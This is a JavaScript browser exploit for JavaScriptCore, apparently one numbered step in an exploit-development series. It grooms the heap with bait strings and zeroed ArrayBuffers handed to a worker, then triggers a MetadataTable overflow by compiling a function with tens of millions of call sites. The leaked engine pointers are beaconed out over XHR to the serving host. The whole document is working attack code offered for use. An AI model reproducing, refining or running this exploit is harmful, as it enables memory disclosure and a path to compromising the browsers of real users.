// p173 — MetadataTable overflow with zeroed ArrayBuffer runway
//
// KEY INSIGHT: The LLInt READS metadata[i] before writing. OOB reads hit
// adjacent heap memory. If that memory contains garbage pointers → crash
// (dereferences bad pointer). If that memory contains ZEROS → slow path
// (cache miss, no crash) → LLInt WRITES real metadata entries back.
//
// Strategy:
// 1. Allocate bait strings (they'll be freed to create a hole)
// 2. Allocate 200 × 100KB ArrayBuffers (zeroed by fastCalloc)
// 3. Transfer ArrayBuffers to worker (backing stays in bmalloc)
// 4. Free baits → GC → metadata buffer fills hole
// 5. Sweep goes forward into zeroed ArrayBuffers:
//    - OOB READs hit zeros → no crash
//    - OOB WRITEs store real metadata entries (JSC pointers!)
// 6. Worker reads ArrayBuffer bytes → extracts pointer values
//
// Beacon prefix: V173-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag) {
    queue.push(tag);
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var tag = queue.shift();
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V173-' + tag + '?t=' + Date.now(), true);
      x.onloadend = function() { setTimeout(drain, 15); };
      x.onerror = function() { setTimeout(drain, 15); };
      x.send();
    } catch(e) { setTimeout(drain, 15); }
  }

  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  var attempt = 0;
  try {
    attempt = parseInt(localStorage.getItem('p173_att') || '0');
    localStorage.setItem('p173_att', '' + (attempt + 1));
  } catch(e) {}

  B('BOOT-A' + attempt);

  // ── Phase 1: Bait strings (will be freed for buffer hole) ──
  var N_BAIT = 20 + (attempt % 5) * 2;
  var STR_LEN = 100000;
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-N' + N_BAIT);

  // ── Phase 2: Zero runway ArrayBuffers ──
  // 200 × 100KB = 20MB of zeros in the same marge tier as the buffer
  // These provide safe OOB reads AND capture written metadata entries
  var N_RUNWAY = 200;
  var AB_SIZE = 102400; // 100KB each, same size class as metadata buffer
  var runway = [];
  try {
    for (var i = 0; i < N_RUNWAY; i++) {
      runway.push(new ArrayBuffer(AB_SIZE));
    }
  } catch(e) {
    B('OOM-RUN-' + runway.length);
  }
  B('RUNWAY-' + runway.length);

  // ── Worker: receives transferred ABs, polls for non-zero bytes ──
  var workerCode = function() {
    var buffers = [];
    var views = [];
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V173-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }
    function hx8(v) {
      var s = '';
      for (var i = 7; i >= 0; i--) s += hx((v >>> (i*4)) & 0xF);
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'buffers') {
        buffers = e.data.abs;
        for (var i = 0; i < buffers.length; i++) {
          views.push(new Uint8Array(buffers[i]));
        }
        beacon('BUFS-' + views.length);
        self.postMessage({ bufsReady: true });
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('T-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCH');
        var found = false;
        var iters = 0;
        var STRIDE = 112;

        // Poll both: string lengths AND ArrayBuffer contents
        while (!found) {
          // Check string lengths (fast)
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              beacon('STR-HIT-' + i + '-len=' + targets[i].length);
              found = true;
              break;
            }
          }
          if (found) break;

          // Check ArrayBuffer views for non-zero bytes
          // Sample every 112 bytes (metadata entry stride) in first few buffers
          if (iters % 100 === 0) {
            for (var bi = 0; bi < Math.min(views.length, 20); bi++) {
              var v = views[bi];
              // Check at metadata-aligned offsets
              for (var off = 0; off < v.length; off += STRIDE) {
                if (v[off] !== 0 || v[off+1] !== 0 || v[off+8] !== 0) {
                  beacon('AB-HIT-buf' + bi + '-off' + off);

                  // Extract 112 bytes of the metadata entry
                  var entry = '';
                  for (var eb = 0; eb < STRIDE && (off+eb) < v.length; eb++) {
                    entry += hx(v[off+eb]);
                  }
                  beacon('ENTRY-' + bi + '-' + entry.substring(0, 200));

                  // Extract likely pointer values (8-byte aligned)
                  for (var po = 0; po < STRIDE; po += 8) {
                    var ptr = 0;
                    var ptrHi = 0;
                    // Read as little-endian 64-bit
                    for (var pb = 3; pb >= 0; pb--) {
                      ptr = (ptr * 256) + v[off+po+pb];
                    }
                    for (var pb = 7; pb >= 4; pb--) {
                      ptrHi = (ptrHi * 256) + v[off+po+pb];
                    }
                    if (ptr !== 0 || ptrHi !== 0) {
                      beacon('PTR-' + bi + '-' + po + '-' + hx8(ptrHi) + hx8(ptr));
                    }
                  }

                  found = true;
                  break;
                }
              }
              if (found) break;
            }
          }

          iters++;
          if (iters % 5000000 === 0) beacon('P-' + iters);
          if (iters > 300000000) { beacon('GIVEUP'); return; }
        }

        if (!found) return;

        // Scan all buffers for written entries
        var hitCount = 0;
        for (var bi = 0; bi < views.length && hitCount < 10; bi++) {
          var v = views[bi];
          for (var off = 0; off < v.length; off += STRIDE) {
            if (v[off] !== 0 || v[off+4] !== 0 || v[off+8] !== 0) {
              hitCount++;
              if (hitCount <= 5) {
                var ent = '';
                for (var eb = 0; eb < 32 && (off+eb) < v.length; eb++) {
                  ent += hx(v[off+eb]);
                }
                beacon('SCAN-' + bi + '-' + off + '-' + ent);
              }
            }
          }
        }
        beacon('TOTAL-HITS-' + hitCount);

        // Also check string lengths
        var lens = '';
        for (var i = 0; i < targets.length; i++) lens += targets[i].length + ',';
        beacon('LENS-' + lens);

        beacon('DONE');
      }
    };
  };

  var watchBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var watcher = new Worker(URL.createObjectURL(watchBlob));
  watcher.postMessage({ cmd: 'init', baseUrl: BASE });

  // Transfer ArrayBuffers to worker
  var transferList = [];
  for (var i = 0; i < runway.length; i++) transferList.push(runway[i]);
  watcher.postMessage({ cmd: 'buffers', abs: runway }, transferList);
  runway = null; // detached on main thread now

  var phase = 0;
  watcher.onmessage = function(e) {
    if (e.data.bufsReady && phase === 0) {
      phase = 1;
      B('BUFS-XFER');
      watcher.postMessage({ cmd: 'alloc' });
    }
    if (e.data.ready && phase === 1) {
      phase = 2;
      B('TARGETS-OK');
      doFreeAndBuild();
    }
  };

  function doFreeAndBuild() {
    // Free baits
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;
    B('BAIT-FREE');

    // GC
    var gc = 0;
    function gcRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      gc++;
      if (gc < 30) setTimeout(gcRound, 30);
      else { B('GC-OK'); doBuild(); }
    }
    gcRound();
  }

  function doBuild() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v173=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v173ok=1;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'M');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMP-' + (window.__v173ok ? 'OK' : 'NO'));
      if (!window.__v173) { B('NOFN'); return; }

      // Start watching BEFORE calling
      watcher.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALL');
        try {
          window.__v173(function(){});
        } catch(ex) {
          B('EX-' + (ex.message || '').substring(0, 20));
        }
        B('ALIVE');
      }, 200);
    };

    sc.onerror = function() { B('SERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
